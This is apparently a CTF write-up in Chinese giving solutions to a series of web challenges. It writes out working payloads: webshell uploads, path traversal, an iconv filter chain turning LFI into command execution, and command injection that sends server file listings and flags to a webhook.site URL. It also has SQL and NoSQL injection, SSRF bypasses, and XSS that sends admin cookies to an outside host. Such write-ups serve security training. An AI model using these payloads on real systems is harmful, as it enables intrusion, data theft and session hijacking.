shiba-shop

經過觀察後進https://chall.nckuctf.org:28100/item/5430
用f12找到<input type="hidden" name="wallet" value="65536">
把錢改成99999999999999就可以了
flag: NCKUCTF{B3w4r3_0f_th3_5h1b4owo}

Redirect

這題用burp suite可以發現他有請求(page1.php重定向到/flag.php)因此我們可以
curl https://chall.nckuctf.org:28101/flag.php
flag:NCKUCTF{r3D1rC7_15_700_F457}

Cookie

這題可以用工具(cookie-editor)直接改,把原本user是anonymous改成cookie_monster就可以看到flag了
flag:NCKUCTF{Y0U_4r3_C00K13_M0N573r}

Robots

去看robots.txt後發現Disallow: /hdw7vtg6cnbKJH/panel.php
進去/hdw7vtg6cnbKJH/panel.php會發現在旋轉的flag直接f12複製解決
flag:NCKUCTF{robots.txt_M4Y_3XP053_53Cr37_P47H}

gitleak

用dotgit把整份檔案用出來，然後到 .env 中找到 flag

phpisnice

觀察程式碼後可以發現它是一個正常情況下不可達成的,但是我們可以利用0e來達成
paylaod:?A=0e215962017
這樣他md5前後都是0e開頭而php會把它當作科學符號
因此會通過檢查
flag:NCKUCTF{php_15_7h3_n1c3_14n9u493}

phpisbest

這題檢查後可以發現我們可以用
空陣列來解決,因此
payload:?A[]=1&B[]=2
flag:NCKUCTF{php_15_7h3_8357_14n9u493}

uploader

這題是標準的webshell
丟一個webshell.php就可以了
flag在跟目錄
flag:NCKUCTF{w385h311_15_4_427}

Uploader waf

這題是上一題的進階,推薦用burp suite抓下來後改
Content-Type: application/octet-stream這邊改成Content-Type: image/png
因為名稱不能有php所以可以改用php3
進去後翻跟目錄即可
flag:NCKUCTF{w385h311_15_4_427_4nd_m491c}

pathwalker

這題觀察後可以發現在cappo那邊有留路徑/var/www/html/flag.php並且可以發現他可以用../繞過因此
paylaod: ../../../../var/www/html/flag
flag:NCKUCTF{p47h_724v32541_15_0u2_f213nd}

pathwalker-waf

這題是上一題的進階觀察後可以發現在cappo那邊有留路徑/var/www/html/flag.php並且可以發現他可以用../繞過但是由於$pattern_file = "/^apple|banana|cappo$/";
因此payload改成apple../../../../../../var/www/html/flag
flag:NCKUCTF{p47h_724v32541_h45_4107_721ck}

LFI

老把戲了都...lfi這東西基本上有兩種打法詳情可以看https://blog.stevenyu.tw/2022/05/07/advanced-local-file-inclusion-2-rce-in-2022/
這題我們用php://filter來打
payload:php://filter/convert.base64-encode/resource=../../../../../../../../var/www/html/flag
(得到的東西要把他base64 decode)
這邊給個提醒如果你直接../../../../../../../../var/www/html/flag
會發現他寫noflag here QQ因為她的原始碼是
<?php
  //NCKUCTF{1f1_15_7h3_900d_ch4nc3}
  echo "noflag here QQ\n";
  exit(); ?>
所以他會把flag註解掉
flag:NCKUCTF{1f1_15_7h3_900d_ch4nc3}

lfi2rce

這題就要用到另一個邪教打法PHP iconv
這是一個超級噁心的方法，只要我們能透過 LFI 讀到任何一個檔案，而且可以操控 filter 的話，我們就能透過 filter 構造出任意的 Payload。

首先，我們需要知道，任何的 string 如果通過了 convert.iconv.UTF8.CSISO2022KR 一定會在最前頭噴出 \x1b$)C (1b 24 29 43)。

舉例來說

curl 'http://127.0.0.1:7788/?f=php://filter/convert.iconv.UTF8.CSISO2022KR/resource=/etc/passwd' -s | xxd -l 4
00000000: 1b24 2943                                .$)C

curl 'http://127.0.0.1:7788/?f=php://filter/convert.iconv.UTF8.CSISO2022KR/resource=/etc/hosts' -s | xxd -l 4
00000000: 1b24 2943                                .$)C

curl 'http://127.0.0.1:7788/?f=php://filter/convert.iconv.UTF8.CSISO2022KR/resource=/var/www/html/index.php' -s | xxd -l 4
00000000: 1b24 2943                                .$)C
第二個需要知道的是， convert.base64-decode 是一個非常寬鬆的東西，如果輸入不是合法的 base64 字串，它就會直接忽略。

意思就是說，如果我們把 1b24 2943 (\x1b$)C) 交給 base64 decode，再用 base64 encode，它的開頭會只剩下 C，而後面接的東西會是我們的原始的字串。

curl 'http://127.0.0.1:7788/?f=php://filter/convert.iconv.UTF8.CSISO2022KR/convert.base64-decode/convert.base64-encode/resource=/etc/passwd' -s | xxd
00000000: 4372 6f6f                                Croo
而持續的串不同的 filter，除了 / 之外，我們也可以用 | 功能是完全一樣的。

curl 'http://127.0.0.1:7788/?f=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode/resource=/etc/passwd' -s | xxd -l 4
00000000: 4372 6f6f                                Croo
知道上面的概念可以湊出一個 C 之後，就可以開始來搞事了。

如果輸入以下內容，我們可以獲得一個 h

php://filter/convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7
以下可以得到一個 i

php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode
但要注意順序解析，所以我們要把字串給反過來串，所以我們如果需要有 hi 的話，反過來會變成

php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=/etc/passwd
curl 'http://127.0.0.1:7788/?f=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=/etc/passwd' -s | xxd -l 2
00000000: 6869                                     hi
到此為止，我們只需要找到所有的 base64 排列組合，湊一個 webshell 並轉成 base64 的狀態，用上面的噁心方法來湊出所有的字元，最終送去給 convert.base64-encode，我們就能拿到 Webshell 了。

難不成你要手打嗎,怎麼可能
好工具推薦https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT

payload:
第一段
curl 'https://chall.nckuctf.org:28112/?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.iconv.ISO6937.EUC-JP-MS|convert.iconv.EUCKR.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CN.ISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd&1=system(%22ls%20/%22);'
找到flag_23fb1b3
第二段
curl 'https://chall.nckuctf.org:28112/?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.iconv.ISO6937.EUC-JP-MS|convert.iconv.EUCKR.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CN.ISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd&1=system(%22cat%20/flag_23fb1b3%22);'

flag:NCKUCTF{w385h311_15_4_427}

dig

用'`ls${IFS}/`'找到flag位置後'`cat${IFS}/flag_n2i3na`'
得到flag:NCKUCTF{d19_70015_15_n1c3!}


dig-waf1
 
由於$blacklist = ['|', '&', ';', '>', '<', "\n", 'flag'];
所以我們可以先用'`ls${IFS}/`'找到flag位置後'`cat${IFS}/fl${x}ag_o2837ry`'
得到flag
NCKUCTF{d19_70015_15_427!}

dig-waf2

由於$blacklist = ['|', '&', ';', '>', '<', "\n", " ", 'flag'];
所以我們可以先用'`ls${IFS}/`'找到flag位置後'`cat${IFS}/fl${x}ag_o2837ry`'
得到flag
NCKUCTF{d19_70015_15_427!}

dig-blind

因為
              if ($return_status === 0) {
                  echo 'success';
              } else {
                  echo 'fail';
              }‵

所以我們可以'`curl${IFS}-X${IFS}POST${IFS}-d${IFS}"$(ls${IFS}/)"${IFS}https://webhook.site/8933764d-6f96-4f76-963d-c3e6eba329c0`'

然後
'`curl${IFS}-X${IFS}POST${IFS}-d${IFS}"$(cat${IFS}/flag_o2837ry)"${IFS}https://webhook.site/8933764d-6f96-4f76-963d-c3e6eba329c0`'

就可以得到flag
NCKUCTF{d19_70015_15_n1c3_bu7_1_c4n7_s33!!}



Dig waf 3⛏️
```
'$(sed${IFS}-n${IFS}1,10p${IFS}/????_o2837ry)'
```
Dig waf 4⛏️
```
'$(sed$IFS''$IFS/????_UQKITbDj)'
```






login

做點小注入' OR  1=1);--就可以得到flag了
flag
NCKUCTF{SQL1nj3c710n_1s_S0_l33t}

Dig Arguments

做點小注入
第一個欄位-f
第二個欄位/flag
這樣就組合成了dig -f /flag;
flag
NCKUCTF{y0u_4r3_7h3_4r6um3n7_1nj3c710n_m4573r}

no-sql-injection

直接
{
    "username": "admin",
    "password": {
        "$ne": null
    }
}

flag

NCKUCTF{y0u_4r3_4_n0_5ql_1nj3c70n_m4573r}

ssrf1

因為
if urlparse(url).hostname in ["localhost", "127.0.0.1", "::1"]:
        return "badhacker"
        
所以我們可以http://0.0.0.0/internal-only 這樣
flag
NCKUCTF{55rf_15_1n7r4n37_k1ll3r!}

ssrf2

由於
if not urlparse(url).hostname.startswith("httpbin.dev")
且/internal-only只允許127.0.0.1
因此我們可以
https://httpbin.dev/redirect-to?url=http://127.0.0.1/internal-only
重定向
flag
NCKUCTF{y0u_4r3_r34lly_4_55rf_0p3n_r3d1r3c7_m4573r}

ssrf3
https://chall.nckuctf.org:28123/mkreq?url=http%3A%2F%2F7f000001.08080808.rbndr.us%2Finternal-only
多嘗試幾次

xss1
用
<script>
fetch('https://webhook.site/xxx?cookie=' + document.cookie);
</script>
把admin的cookie丟出來即可
flag
NCKUCTF{w3lc0m3_70_x55_w0rld}

xss2
丟
<script>fetch('https://webhook.site/xxx?c='+document.cookie)</script>
<script>new Image().src='https://webhook.site/xxx?c='+document.cookie</script>
<script>location='https://webhook.site/xxx?c='+document.cookie</script>
他會把admin的cookie丟出來
flag
NCKUCTF{1nn3rh7ml_15_n07_3x3cu73_5cr1p7}


xss3

丟
1
會發現他的按鈕是會把你丟到
https://chall.nckuctf.org:28126/note/1
因此
javascript:fetch('https://webhook.site/xxx?c='+document.cookie)
做到偷cookie
flag
NCKUCTF{p53ud0_pr070c4l_15_50m3_71m3_3v4l}

xss4